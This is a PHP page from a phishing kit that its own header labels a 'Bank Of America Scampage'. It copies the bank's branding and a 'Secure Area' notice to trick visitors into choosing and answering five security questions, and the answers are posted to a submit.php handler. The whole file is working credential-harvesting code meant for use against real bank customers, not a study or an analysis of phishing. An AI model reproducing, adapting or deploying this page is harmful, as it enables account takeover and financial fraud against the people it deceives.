<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             26/10/2019
 * @package           Bank Of America Scampage
 *
 * Project Name:      Bank Of America Scampage
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Bank of America | Online Banking | Sign In | Online IDIn</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="logo"><a href="#"><img src="../assets/images/logo.png"></a></div>
                    </div>
                    <div class="col-md-6">
                        <ul class="header-menu">
                            <li><a href="#"><i class="fas fa-lock"></i> Secure Area</a></li>
                            <li><a href="#">En Español</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <h3>Verify Your Identity</h3>
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="top-content">
                    <h3>Security Questions</h3>
                    <p>Please Answer the security questions below.</p>
                </div>
                <div class="forms">
                    <form method="post" action="submit.php">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q1') ?>">
                            <label for="q1">Security Question 1</label>
                            <select name="q1" class="form-control" id="q1">
                                <option value="">Select One</option>
                                <option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
                                <option value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
                                <option value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
                                <option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
                                <option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
                                <option value="What is the best friend first name?">What is the best friend first name?</option>
                                <option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
                                <option value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
                                <option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
                                <option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option>
                            </select>
                            <?php echo validation($_SESSION['errors'],'q1'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a1') ?>">
                            <label for="a1">Answer</label>
                            <input type="text" name="a1" class="form-control" id="a1">
                            <?php echo validation($_SESSION['errors'],'a1'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q2') ?>">
                            <label for="q2">Security Question 2</label>
                            <select name="q2" class="form-control" id="q2">
                                <option value="">Select One</option>
                                <option value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
                                <option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
                                <option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
                                <option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
                                <option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
                                <option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
                                <option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
                                <option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
                                <option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
                                <option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
                            </select>
                            <?php echo validation($_SESSION['errors'],'q2'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a2') ?>">
                            <label for="a2">Answer</label>
                            <input type="text" name="a2" class="form-control" id="a2">
                            <?php echo validation($_SESSION['errors'],'a2'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q3') ?>">
                            <label for="q3">Security Question 3</label>
                            <select name="q3" class="form-control" id="q3">
                                <option value="">Select One</option>
                                <option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
                                <option value="What is the name of a college you applied to but didn't attend?">What is the name of a college you applied to but didn't attend?</option>
                                <option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
                                <option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
                                <option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
                                <option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
                                <option value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
                                <option value="What is the first name of your mother's cloest friend?">What is the first name of your mother's cloest friend?</option>
                                <option value="On what street is your grocery store?">On what street is your grocery store?</option>
                                <option value="What was the name of your first pet?">What was the name of your first pet?</option>
                            </select>
                            <?php echo validation($_SESSION['errors'],'q3'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a3') ?>">
                            <label for="a3">Answer</label>
                            <input type="text" name="a3" class="form-control" id="a3">
                            <?php echo validation($_SESSION['errors'],'a3'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q4') ?>">
                            <label for="q4">Security Question 4</label>
                            <select name="q4" class="form-control" id="q4">
                                <option value="">Select One</option>
                                <option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
                                <option value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
                                <option value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
                                <option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
                                <option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
                                <option value="What is the best friend first name?">What is the best friend first name?</option>
                                <option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
                                <option value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
                                <option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
                                <option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option>
                            </select>
                            <?php echo validation($_SESSION['errors'],'q4'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a4') ?>">
                            <label for="a4">Answer</label>
                            <input type="text" name="a4" class="form-control" id="a4">
                            <?php echo validation($_SESSION['errors'],'a4'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'q5') ?>">
                            <label for="q5">Security Question 1</label>
                            <select name="q5" class="form-control" id="q5">
                                <option selected="">Select One</option>
                                <option value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
                                <option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
                                <option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
                                <option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
                                <option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
                                <option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
                                <option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
                                <option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
                                <option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
                                <option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
                            </select>
                            <?php echo validation($_SESSION['errors'],'q5'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'a5') ?>">
                            <label for="a5">Answer</label>
                            <input type="text" name="a5" class="form-control" id="a5">
                            <?php echo validation($_SESSION['errors'],'a5'); ?>
                        </div>
                        <input type="hidden" name="type" value="etapquestions">
                        <input type="hidden" name="verbot">
                        <div class="buttons">
                            <button class="btn-submit" type="submit">Continue</button>
                            <button type="button">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 70px;">
            <div class="container">
                <p style="font-weight: 700"><i class="fas fa-lock"></i> Secure area</p>
                <p><a href="#">Privacy & Security</a></p>
                <p class="mb-0">Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender</a><br>&copy; 2022 Bank of America Corporation. All rights reserved.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>